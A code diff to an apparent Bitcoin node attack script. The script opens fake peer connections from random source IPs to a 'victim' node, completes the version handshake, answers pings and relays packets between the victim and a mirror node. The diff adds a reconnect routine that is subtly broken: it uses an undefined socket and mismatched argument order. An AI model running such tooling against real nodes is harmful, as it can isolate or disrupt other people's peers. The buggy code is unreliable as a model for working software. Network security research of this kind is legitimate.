@@ -196,12 +196,12 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 
 	# Send version packet
 	version = version_packet(src_ip, dst_ip, src_port, dst_port)
-	s.send(version.to_bytes())
+	s.sendall(version.to_bytes())
 	# Get verack packet
 	verack = s.recv(1924)
 	# Send verack packet
 	verack = msg_verack(bitcoin_protocolversion)
-	s.send(verack.to_bytes())
+	s.sendall(verack.to_bytes())
 	# Get verack packet
 	verack = s.recv(1024)
 
@@ -247,6 +247,19 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 		except:
 			print(f'Error: unable to start thread to sniff interface {interface}')"""
 
+# Reconnect a peer
+def reconnect(socket, src_ip, dst_ip, src_port, dst_port):
+	print(f'Reconnecting to ({dst_ip} : {dst_port})')
+	s.connect((dst_ip, dst_port))
+	version = version_packet(src_ip, dst_ip, src_port, dst_port)
+	s.sendall(version.to_bytes())
+	verack = s.recv(1924)
+	verack = msg_verack(bitcoin_protocolversion)
+	s.sendall(verack.to_bytes())
+	verack = s.recv(1024)
+	print(f'Successfully reconnected ({src_ip} : {src_port})')
+
+
 
 # Creates a fake connection to the victim
 def mirror_make_fake_connection(interface, src_ip, verbose=True):
@@ -276,12 +289,12 @@ def mirror_make_fake_connection(interface, src_ip, verbose=True):
 
 	# Send version packet
 	version = version_packet(src_ip, dst_ip, src_port, dst_port)
-	s.send(version.to_bytes())
+	s.sendall(version.to_bytes())
 	# Get verack packet
 	verack = s.recv(1924)
 	# Send verack packet
 	verack = msg_verack(bitcoin_protocolversion)
-	s.send(verack.to_bytes())
+	s.sendall(verack.to_bytes())
 	# Get verack packet
 	verack = s.recv(1024)
 
@@ -293,7 +306,7 @@ def mirror_make_fake_connection(interface, src_ip, verbose=True):
 def sniff(thread, socket, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface):
 	while not thread.stopped():
 		packet = socket.recv(65565)
-		create_task('Process packet ' + src_ip, packet_received, thread, packet, socket, mirror_socket, dst_ip, dst_port, src_ip, src_port, interface)
+		create_task('Process packet ' + src_ip, packet_received, thread, packet, socket, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface)
 
 def mirror_sniff(thread, socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface):
 	while not thread.stopped():
@@ -302,7 +315,12 @@ def mirror_sniff(thread, socket, orig_socket, src_ip, src_port, dst_ip, dst_port
 
 # Called when a packet is sniffed from the network
 # Return true to end the thread
-def packet_received(thread, parent_thread, packet, socket, mirror_socket, from_ip, from_port, to_ip, to_port, interface):
+def packet_received(thread, parent_thread, packet, socket, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface):
+	from_ip = dst_ip
+	from_port = dst_port
+	to_ip = src_ip
+	to_port = src_port
+
 	if len(packet) >= 4:
 		is_bitcoin = (packet[0:4] == b'\xf9\xbe\xb4\xd9')
 	else:
@@ -337,22 +355,30 @@ def packet_received(thread, parent_thread, packet, socket, mirror_socket, from_i
 
 			pong = msg_pong(bitcoin_protocolversion)
 			pong.nonce = msg.nonce
-			socket.send(pong.to_bytes())
+			socket.sendall(pong.to_bytes())
 		elif msg_type == 'version': pass # Ignore version
 		elif msg_type == 'verack': pass # Ignore version
 		else:
-			mirror_socket.send(packet) # Relay to the mirror
+			mirror_socket.sendall(packet) # Relay to the mirror
 
 	except Exception as e:
-		parent_thread.stop()
-		close_connection(socket, mirror_socket, from_ip, from_port, interface)
-		print("Closing socket because of error: " + str(e))
-		make_fake_connection(src_ip = random_ip(), dst_ip = victim_ip, verbose = False, attempt_number = 3)
+		print(f'Lost connection to ({from_ip} : {from_port})')
+		reconnect(mirror_socket, src_ip, src_port, dst_ip, dst_port)
+		#parent_thread.stop()
+		#close_connection(socket, mirror_socket, from_ip, from_port, interface)
+		#print("Closing socket because of error: " + str(e))
+		#make_fake_connection(src_ip = random_ip(), dst_ip = victim_ip, verbose = False, attempt_number = 3)
 	return
 
 # Called when a packet is sniffed from the network
 # Return true to end the thread
-def mirror_packet_received(thread, parent_thread, packet, socket, orig_socket, from_ip, from_port, to_ip, to_port, interface):
+
+def mirror_packet_received(thread, parent_thread, packet, socket, orig_socket, src_ip, src_port, dst_ip, dst_port, interface):
+	from_ip = src_ip
+	from_port = src_port
+	to_ip = dst_ip
+	to_port = dst_port
+
 	if len(packet) >= 4:
 		is_bitcoin = (packet[0:4] == b'\xf9\xbe\xb4\xd9')
 	else:
@@ -396,14 +422,16 @@ def mirror_packet_received(thread, parent_thread, packet, socket, orig_socket, f
 
 			pong = msg_pong(bitcoin_protocolversion)
 			pong.nonce = msg.nonce
-			socket.send(pong.to_bytes())
+			socket.sendall(pong.to_bytes())
 		else:
-			orig_socket.send(packet) # Relay to the victim
+			orig_socket.sendall(packet) # Relay to the victim
 
 	except Exception as e:
-		print("Closing socket because of error: " + str(e))
-		parent_thread.stop()
-		socket.close()
+		print(f'Lost connection to ({from_ip} : {from_port})')
+		reconnect(orig_socket, src_ip, src_port, dst_ip, dst_port)
+		# print("Closing socket because of error: " + str(e))
+		# parent_thread.stop()
+		# socket.close()
 
 	return
 
